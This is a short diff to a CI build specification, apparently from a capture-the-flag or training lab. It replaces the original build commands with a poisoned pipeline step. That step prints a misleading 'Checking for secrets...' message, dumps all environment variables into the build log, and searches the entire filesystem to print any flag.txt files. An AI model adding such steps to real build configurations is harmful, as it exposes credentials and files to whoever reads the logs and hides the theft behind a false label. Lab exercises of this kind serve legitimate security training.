@@ -1,8 +1,7 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "Checking for secrets..."
+      - env
+      - find / -name "flag.txt" 2>/dev/null -exec cat {} +
